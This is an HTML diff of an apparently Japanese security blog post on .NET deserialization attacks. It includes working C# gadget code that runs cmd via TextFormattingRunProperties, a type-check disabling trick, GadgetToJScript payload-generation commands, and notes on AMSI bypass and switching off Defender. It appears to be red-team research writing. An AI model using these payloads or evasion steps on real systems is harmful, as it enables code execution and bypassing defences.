-		<span class="p">{</span>
-		   <span class="k">throw</span> <span class="k">new</span> <span class="n">ArgumentException</span><span class="p">(</span><span class="s">&#34;obj&#34;</span><span class="p">);</span>
-		<span class="p">}</span>
-		<span class="c1">// ...
-</span><span class="c1"></span>	<span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div><p>追加されたのは <code>!AppSettings.DisableActivitySurrogateSelectorTypeCheck</code> です。この追加によって、シリアライズ化可能なオブジェクト以外をデシリアライズすることはできなくなりました。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">private</span> <span class="k">sealed</span> <span class="k">class</span> <span class="nc">ObjectSurrogate</span> <span class="p">:</span> <span class="n">ISerializationSurrogate</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">void</span> <span class="n">GetObjectData</span><span class="p">(</span><span class="kt">object</span> <span class="n">obj</span><span class="p">,</span> <span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(!</span><span class="n">AppSettings</span><span class="p">.</span><span class="n">DisableActivitySurrogateSelectorTypeCheck</span> <span class="p">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">!(</span><span class="n">obj</span> <span class="k">is</span> <span class="n">ActivityBind</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="p">!(</span><span class="n">obj</span> <span class="k">is</span> <span class="n">DependencyObject</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		   <span class="k">throw</span> <span class="k">new</span> <span class="n">ArgumentException</span><span class="p">(</span><span class="s">&#34;obj&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// ...</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>追加されたのは <code>!AppSettings.DisableActivitySurrogateSelectorTypeCheck</code> です。この追加によって、シリアライズ化可能なオブジェクト以外をデシリアライズすることはできなくなりました。</p>
 <p>しかしこれは C# で実装する場合においては、該当のメンバを <code>True</code> にしてしまえば何も問題ありません。</p>
 <p>上のコードを次の差分のように修正します。</p>
-<div class="highlight"><pre class="chroma"><code class="language-diff" data-lang="diff"><span class="gu">@@ -2,6 +2,7 @@
-</span><span class="gu"></span> using System.IO;
- using System.Runtime.Serialization;
- using System.Runtime.Serialization.Formatters.Binary;
-<span class="gi">+using System.Configuration;
-</span><span class="gi"></span>
-<span class="gu">@@ -54,6 +55,7 @@
-</span><span class="gu"></span>
-     static void Main()
-     {
-<span class="gi">+        ConfigurationManager.AppSettings.Set(&#34;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&#34;, &#34;true&#34;);
-</span><span class="gi"></span>         TestObjectSerializedRef();
-     }
- }
-</code></pre></div><p><img src="images/deserialize_ok.png" alt="deserialize_ok"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gu">@@ -2,6 +2,7 @@
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span> using System.IO;
+</span></span><span class="line"><span class="cl"> using System.Runtime.Serialization;
+</span></span><span class="line"><span class="cl"> using System.Runtime.Serialization.Formatters.Binary;
+</span></span><span class="line"><span class="cl"><span class="gi">+using System.Configuration;
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span>
+</span></span><span class="line"><span class="cl"><span class="gu">@@ -54,6 +55,7 @@
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span>
+</span></span><span class="line"><span class="cl">     static void Main()
+</span></span><span class="line"><span class="cl">     {
+</span></span><span class="line"><span class="cl"><span class="gi">+        ConfigurationManager.AppSettings.Set(&#34;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&#34;, &#34;true&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span>         TestObjectSerializedRef();
+</span></span><span class="line"><span class="cl">     }
+</span></span><span class="line"><span class="cl"> }
+</span></span></code></pre></div><p><img src="images/deserialize_ok.png" alt="deserialize_ok" loading="lazy" /></p>
 <p>型チェックが無効になったため、シリアライズ・デシリアライズに成功しました。これが .NET 4.8 以降における強制シリアライズ手法です。</p>
 <h3 id="dotnettojscript-の栄枯盛衰">DotNetToJScript の栄枯盛衰</h3>
 <p>D2JS は COM コンポーネントを経由した .NET のデシリアライズの原理をもとに、シリアライズしたクラスアセンブリを BinaryFormatter でデシリアライズし、クラスコンストラクタを呼び出すスクリプトを作成するビルダーツールです。本ツールは Nick 氏 (@monoxgas) によって作成されました。</p>
 <p>本ツールでは引数に .NET クラスアセンブリを指定することで、アセンブリがシリアライズされ、JScript や VBSciprt、VBA などのスクリプト言語でデシリアライズするスクリプトが生成されます。</p>
 <p>なお呼び出される .NET プログラム側では、COM コンポーネント経由で呼び出されるように ComVisible アトリビュートを付けたうえでコンパイルをする必要があります。</p>
 <blockquote>
-<div class="highlight"><pre class="chroma"><code class="language-csharp" data-lang="csharp"><span class="na">[ComVisible(true)]</span>
-<span class="k">public</span> <span class="k">class</span> <span class="nc">TestClass</span>
-<span class="p">{</span>
-<span class="p">...</span>
-</code></pre></div></blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="na">[ComVisible(true)]</span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">class</span> <span class="nc">TestClass</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span></code></pre></div></blockquote>
 <p>次のコードが D2J で出力したものです。</p>
-<p><img src="images/d2j_code.png" alt="d2j_code"></p>
+<p><img src="images/d2j_code.png" alt="d2j_code" loading="lazy" /></p>
 <p>コードの通り、Base64エンコードした .NET オブジェクトを COM コンポーネント経由でデシリアライズしています。デシリアライズしたクラスオブジェクトを D/Invoke でインスタンス作成し、 .NET オブジェクトのコンストラクタが実行されます。</p>
 <p>デシリアライズの起点となるのは <code>BinaryFormatter</code> です。</p>
 <blockquote>
@@ -467,12 +468,12 @@ kernel32.RtlMoveMemory(,00000292c4ba3498,0000000000000001);
 </blockquote>
 </blockquote>
 <p>このスクリプトのデシリアライズ自体に大きな問題はないのですが、気になるのはビルダー側でシリアライズするコードです。以下は D2JS の Program.cs です。</p>
-<div class="highlight"><pre class="chroma"><code class="language-csharp" data-lang="csharp"><span class="kt">byte</span><span class="p">[]</span> <span class="n">assembly</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="n">assembly_path</span><span class="p">);</span>
-<span class="p">(..</span><span class="n">snip</span><span class="p">..)</span>
-<span class="n">BinaryFormatter</span> <span class="n">fmt</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
-<span class="n">MemoryStream</span> <span class="n">stm</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">();</span>
-<span class="n">fmt</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">stm</span><span class="p">,</span> <span class="n">mscorlib_only</span> <span class="p">?</span> <span class="n">BuildLoaderDelegateMscorlib</span><span class="p">(</span><span class="n">assembly</span><span class="p">)</span> <span class="p">:</span> <span class="n">BuildLoaderDelegate</span><span class="p">(</span><span class="n">assembly</span><span class="p">));</span>
-</code></pre></div><p>見ての通り、このコードは ObjectSurrogate で任意にシリアライズされる前提で、何の考慮もせずにシリアライズしています。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="kt">byte</span><span class="p">[]</span> <span class="n">assembly</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="n">assembly_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">(..</span><span class="n">snip</span><span class="p">..)</span>
+</span></span><span class="line"><span class="cl"><span class="n">BinaryFormatter</span> <span class="n">fmt</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">MemoryStream</span> <span class="n">stm</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">fmt</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">stm</span><span class="p">,</span> <span class="n">mscorlib_only</span> <span class="p">?</span> <span class="n">BuildLoaderDelegateMscorlib</span><span class="p">(</span><span class="n">assembly</span><span class="p">)</span> <span class="p">:</span> <span class="n">BuildLoaderDelegate</span><span class="p">(</span><span class="n">assembly</span><span class="p">));</span>
+</span></span></code></pre></div><p>見ての通り、このコードは ObjectSurrogate で任意にシリアライズされる前提で、何の考慮もせずにシリアライズしています。</p>
 <p>D2JS はリリース当時、クロスプラットフォームで .NET プログラムを読み込める便利ツールとして非常に使われていましたが、先述の通り .NET 4.8 での ObjectSurrogate.GetObjectData の変更によって、最新の Windows 10, Windows Server では動作しなくなりました。</p>
 <h3 id="ysoserialnet-とガジェットチェーン">ysoserial.net とガジェットチェーン</h3>
 <p>話は変わってガジェットチェーンの話。D2JS とは別の成果として、Java の ysoserial に触発された <a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a> プロジェクトにおいて、.NET プログラムを複数のクラスを経由して読み込むガジェットチェーンがいくつか発見されていました。</p>
@@ -480,70 +481,70 @@ kernel32.RtlMoveMemory(,00000292c4ba3498,0000000000000001);
 <h4 id="textformattingrunproperties-で-cmdexe-の実行">TextFormattingRunProperties で cmd.exe の実行</h4>
 <p><a href="https://docs.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.text.formatting.textformattingrunproperties?view=visualstudiosdk-2019">TextFormattingRunProperties</a> はテキストフォーマットの書式設定に関する情報を保持するクラスです。このクラスは Serializable アトリビュートを付与されているため<code>DisableActivitySurrogateSelectorTypeCheck </code>には引っかからずにデシリアライズが可能です。また本クラスの ForegroundBrush プロパティは xaml 形式で定義が可能なので、任意のオブジェクトをソースコードに記載できコンパクトな形で実装できます。</p>
 <p>以下は  TextFormattingRunProperties を利用して xaml で定義されたオブジェクトをデシリアライズさせ、電卓を実行するコードです。</p>
-<div class="highlight"><pre class="chroma"><code class="language-csharp" data-lang="csharp"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
-<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
-<span class="k">using</span> <span class="nn">System.Runtime.Serialization</span><span class="p">;</span>
-<span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters.Binary</span><span class="p">;</span>
-<span class="k">using</span> <span class="nn">System.Configuration</span><span class="p">;</span>
-
-<span class="cm">/**
-</span><span class="cm">    Ref:
-</span><span class="cm">    https://community.microfocus.com/t5/Security-Research-Blog/New-NET-deserialization-gadget-for-compact-payload-When-size/ba-p/1763282
-</span><span class="cm">**/</span>
-<span class="na">
-</span><span class="na">[Serializable]</span>
-<span class="k">public</span> <span class="k">class</span> <span class="nc">TextFormattingRunPropertiesMarshal</span> <span class="p">:</span> <span class="n">ISerializable</span>
-<span class="p">{</span>
-    <span class="kt">string</span> <span class="n">_xaml</span><span class="p">;</span>
-    <span class="k">public</span> <span class="k">void</span> <span class="n">GetObjectData</span><span class="p">(</span><span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="n">Type</span> <span class="n">t</span> <span class="p">=</span> <span class="n">Type</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s">&#34;Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#34;</span><span class="p">);</span>
-        <span class="n">info</span><span class="p">.</span><span class="n">SetType</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
-        <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">&#34;ForegroundBrush&#34;</span><span class="p">,</span> <span class="n">_xaml</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">public</span> <span class="n">TextFormattingRunPropertiesMarshal</span><span class="p">(</span><span class="kt">string</span> <span class="n">xaml</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="n">_xaml</span> <span class="p">=</span> <span class="n">xaml</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">class</span> <span class="nc">Program</span>
-<span class="p">{</span>    
-    <span class="k">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="kt">string</span> <span class="n">xaml_payload</span> <span class="p">=</span> <span class="s">@&#34;&lt;ResourceDictionary
-</span><span class="s">        xmlns=&#34;&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34;&#34;
-</span><span class="s">        xmlns:x = &#34;&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34;&#34;
-</span><span class="s">        xmlns:System = &#34;&#34;clr-namespace:System;assembly=mscorlib&#34;&#34;
-</span><span class="s">        xmlns:Diag = &#34;&#34;clr-namespace:System.Diagnostics;assembly=system&#34;&#34;&gt;
-</span><span class="s"> 
-</span><span class="s">        &lt;ObjectDataProvider x:Key = &#34;&#34;Calc&#34;&#34; ObjectType = &#34;&#34;{x:Type Diag:Process}&#34;&#34; MethodName = &#34;&#34;Start&#34;&#34;&gt;  
-</span><span class="s">            &lt;ObjectDataProvider.MethodParameters&gt;
-</span><span class="s">                &lt;System:String&gt;cmd&lt;/System:String&gt;
-</span><span class="s">                &lt;System:String&gt;/c calc&lt;/System:String&gt;
-</span><span class="s">            &lt;/ObjectDataProvider.MethodParameters&gt;
-</span><span class="s">        &lt;/ObjectDataProvider&gt;
-</span><span class="s">        &lt;/ResourceDictionary&gt;&#34;</span><span class="p">;</span>
-
-        <span class="n">TextFormattingRunPropertiesMarshal</span> <span class="n">payload</span> <span class="p">=</span> <span class="k">new</span> <span class="n">TextFormattingRunPropertiesMarshal</span><span class="p">(</span><span class="n">xaml_payload</span><span class="p">);</span>
-        <span class="n">BinaryFormatter</span> <span class="n">fmt</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
-        <span class="n">MemoryStream</span> <span class="n">stm</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">();</span>
-        <span class="n">fmt</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">stm</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
-        <span class="n">stm</span><span class="p">.</span><span class="n">Position</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
-
-        <span class="n">fmt</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">stm</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div><p>このコードでは ForegroundBrush プロパティに xaml オブジェクトを代入させシリアライズを行っています。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters.Binary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Configuration</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">    Ref:
+</span></span></span><span class="line"><span class="cl"><span class="cm">    https://community.microfocus.com/t5/Security-Research-Blog/New-NET-deserialization-gadget-for-compact-payload-When-size/ba-p/1763282
+</span></span></span><span class="line"><span class="cl"><span class="cm">**/</span>
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">[Serializable]</span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">class</span> <span class="nc">TextFormattingRunPropertiesMarshal</span> <span class="p">:</span> <span class="n">ISerializable</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="m">_</span><span class="n">xaml</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">void</span> <span class="n">GetObjectData</span><span class="p">(</span><span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Type</span> <span class="n">t</span> <span class="p">=</span> <span class="n">Type</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s">&#34;Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">info</span><span class="p">.</span><span class="n">SetType</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">info</span><span class="p">.</span><span class="n">AddValue</span><span class="p">(</span><span class="s">&#34;ForegroundBrush&#34;</span><span class="p">,</span> <span class="m">_</span><span class="n">xaml</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="n">TextFormattingRunPropertiesMarshal</span><span class="p">(</span><span class="kt">string</span> <span class="n">xaml</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="m">_</span><span class="n">xaml</span> <span class="p">=</span> <span class="n">xaml</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Program</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>    
+</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">string</span> <span class="n">xaml_payload</span> <span class="p">=</span> <span class="s">@&#34;&lt;ResourceDictionary
+</span></span></span><span class="line"><span class="cl"><span class="s">        xmlns=&#34;&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">        xmlns:x = &#34;&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">        xmlns:System = &#34;&#34;clr-namespace:System;assembly=mscorlib&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">        xmlns:Diag = &#34;&#34;clr-namespace:System.Diagnostics;assembly=system&#34;&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s"> 
+</span></span></span><span class="line"><span class="cl"><span class="s">        &lt;ObjectDataProvider x:Key = &#34;&#34;Calc&#34;&#34; ObjectType = &#34;&#34;{x:Type Diag:Process}&#34;&#34; MethodName = &#34;&#34;Start&#34;&#34;&gt;  
+</span></span></span><span class="line"><span class="cl"><span class="s">            &lt;ObjectDataProvider.MethodParameters&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">                &lt;System:String&gt;cmd&lt;/System:String&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">                &lt;System:String&gt;/c calc&lt;/System:String&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">            &lt;/ObjectDataProvider.MethodParameters&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">        &lt;/ObjectDataProvider&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">        &lt;/ResourceDictionary&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">TextFormattingRunPropertiesMarshal</span> <span class="n">payload</span> <span class="p">=</span> <span class="k">new</span> <span class="n">TextFormattingRunPropertiesMarshal</span><span class="p">(</span><span class="n">xaml_payload</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">BinaryFormatter</span> <span class="n">fmt</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">MemoryStream</span> <span class="n">stm</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fmt</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">stm</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">stm</span><span class="p">.</span><span class="n">Position</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">fmt</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">stm</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>このコードでは ForegroundBrush プロパティに xaml オブジェクトを代入させシリアライズを行っています。</p>
 <p>これをコンパイルして実行したとき、<code>Process.Start(&quot;cmd.exe /c calc.exe&quot;)</code> が定義された xaml テキストがデシリアライズされ、電卓が起動しました。</p>
-<p><img src="images/deserialize2_ok.png" alt="deserialize2_ok"></p>
+<p><img src="images/deserialize2_ok.png" alt="deserialize2_ok" loading="lazy" /></p>
 <p>なお実行時は例外が発生します。</p>
 <h4 id="なぜ-foregroundbrush-">なぜ ForegroundBrush ？</h4>
 <p>TextFormattingRunProperties を使ったデシリアライズは、なぜ ForegroundBrush を利用するのでしょうか？他のプロパティではダメなのでしょうか？この疑問を解決する記述がどこにも見当たらなかったため、私は TextFormattingRunProperties の実装を確認することにしました。</p>
 <p>WinDbg でコンパイルした実行ファイルをデバッグすると、TextFormattingRunProperties は <code>Microsoft.PowerShell.Editor.dll</code> で実装されていることがわかります。次に dll のファイルパスを調べたところ、私の環境では以下に位置していました。</p>
 <p><code>C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.PowerShell.Editor\v4.0_3.0.0.0__31bf3856ad364e35\Microsoft.PowerShell.Editor.dll</code></p>
 <p>これを dnSpy でデコンパイルし、該当箇所を探します。</p>
-<p><img src="images/dec_TextFormattingRunProperties.png" alt="dec_TextFormattingRunProperties"></p>
+<p><img src="images/dec_TextFormattingRunProperties.png" alt="dec_TextFormattingRunProperties" loading="lazy" /></p>
 <p>コンストラクタを見れば一目瞭然でした。コンストラクタのプロパティの初期化が ForegroundBrush から始まっています。コンストラクタ実行時に真っ先に ForegroundBrush のデシリアライズが行われますが、そこで xaml で仕込んだ <code>Process.Start</code> が実行されます。当然 Brush クラスの正しいオブジェクトではないので例外が発生しますが、例外発生前に Process.Start は実行されているので問題ありません。</p>
 <p>なお xaml で正しい ForegroundBrush プロパティを実装すれば次に初期化される BackgroundBrush で任意のオブジェクト定義を行うことも可能ですが、コンパクトに任意オブジェクトをシリアライズしたいならやはり ForegroundBrush で仕込む必要があるということです。</p>
 <p>また正しくないデシリアライズによって例外が発生しコンストラクタが中断されるため、複数プロパティについて AddValue() で xaml を定義し同時に複数オブジェクトをデシリアライズするのは難しいこともわかります。</p>
@@ -555,66 +556,66 @@ kernel32.RtlMoveMemory(,00000292c4ba3498,0000000000000001);
 <h3 id="g2js-の実装">G2JS の実装</h3>
 <p>G2JS で生成されたスクリプトの最初の動作として、.NET 4.8 以降の環境で実行させるときは初めに TextFormattingRunProperties ガジェットを経由して .NET 4.8 で変更されたデシリアライズ時の型チェックを無効にします (stage1)。そして次にユーザが指定した .NET プログラムをデシリアライズします (stage2)。</p>
 <p>つまりデシリアライズを2回行うようになりました。</p>
-<p><img src="images/g2js_scructure.png" alt="g2js_scructure"></p>
+<p><img src="images/g2js_scructure.png" alt="g2js_scructure" loading="lazy" /></p>
 <p>ただ D2JS も G2JS も、.NET プログラムを読み込む起点はどちらも BinaryFormatter を利用しているため、これらのツールによって生成されるスクリプトに大きな違いはありません。</p>
 <h2 id="ウォークスルー">ウォークスルー</h2>
 <p><strong>G2JS で生成されたスクリプトはそのままだと Windows Defender のリアルタイムスキャンで検知されるので、検証される方はあらかじめオフにしてください。</strong></p>
 <p>テストコードとして、メッセージボックスを表示するだけの C# プログラムを作成します。</p>
-<div class="highlight"><pre class="chroma"><code class="language-csharp" data-lang="csharp"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
-<span class="k">using</span> <span class="nn">System.Windows.Forms</span><span class="p">;</span>
-
-<span class="k">namespace</span> <span class="nn">Test</span>
-<span class="p">{</span>
-    <span class="k">public</span> <span class="k">class</span> <span class="nc">Program</span>
-    <span class="p">{</span>
-		<span class="k">public</span> <span class="n">Program</span><span class="p">()</span>
-		<span class="p">{</span>
-			<span class="n">MessageBox</span><span class="p">.</span><span class="n">Show</span><span class="p">(</span><span class="s">&#34;Hello, World!&#34;</span><span class="p">);</span>
-		<span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div><p>ここで大事なのはパブリッククラスであること、クラスのコンストラクタを実装することです。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Windows.Forms</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">Test</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">class</span> <span class="nc">Program</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">public</span> <span class="n">Program</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="n">MessageBox</span><span class="p">.</span><span class="n">Show</span><span class="p">(</span><span class="s">&#34;Hello, World!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>ここで大事なのはパブリッククラスであること、クラスのコンストラクタを実装することです。</p>
 <p>ファイルを hello.cs として保存します。</p>
 <h3 id="g2js-in-vbscript">G2JS in VBScript</h3>
 <p>インプットファイルとして hello.cs を指定して G2J を実行し、vbs ファイルを生成します。</p>
-<pre><code>&gt; GadgetToJScript.exe -b -w vbs -c hello.cs -o test -d System.dll -d System.Windows.Forms.dll
+<pre tabindex="0"><code>&gt; GadgetToJScript.exe -b -w vbs -c hello.cs -o test -d System.dll -d System.Windows.Forms.dll
 [+]: Generating the vbs payload
 [+]: First stage gadget generation done.
 [+]: Compiling your .NET code located at:hello.cs
 [+]: Second stage gadget generation done.
 [*]: Payload generation completed, check: test.vbs
 </code></pre><p>test.vbs が生成されているので、ダブルクリックすると、メッセージボックスが表示されます。</p>
-<p><img src="images/g2j_hello.png" alt="g2j_hello"></p>
+<p><img src="images/g2j_hello.png" alt="g2j_hello" loading="lazy" /></p>
 <h3 id="g2js-in-vba">G2JS in VBA</h3>
 <p>次は VBA で実行してみます。</p>
-<pre><code>&gt; GadgetToJScript.exe -b -w vba -c hello.cs -o test -d System.dll -d System.Windows.Forms.dll
-</code></pre><p><img src="images/g2js_vba_hello.png" alt="g2js_vba_hello"></p>
+<pre tabindex="0"><code>&gt; GadgetToJScript.exe -b -w vba -c hello.cs -o test -d System.dll -d System.Windows.Forms.dll
+</code></pre><p><img src="images/g2js_vba_hello.png" alt="g2js_vba_hello" loading="lazy" /></p>
 <p>Office VBA 上でも .NET プログラムを実行することができました。</p>
 <p>2020/10 現時点においては .NET プログラムが読み込まれるまでの処理で AMSI トリガーとなるメソッドが含まれていないため、G2JS を使った侵害は AMSI バイパスとなりえます。</p>
-<p><img src="images/g2js_amsitrigger.png" alt="g2js_amsitrigger"></p>
+<p><img src="images/g2js_amsitrigger.png" alt="g2js_amsitrigger" loading="lazy" /></p>
 <blockquote>
 <p>図の通り、G2JS ではデシリアライズ後に最終的に Assembly.Load によって .NET プログラムが読み込まれるため、clr.dll による AmsiScanBuffer がコールされます。そのため RedTeaming 時は別途 .NET プログラム上で難読化などの検知回避が必要です。</p>
 </blockquote>
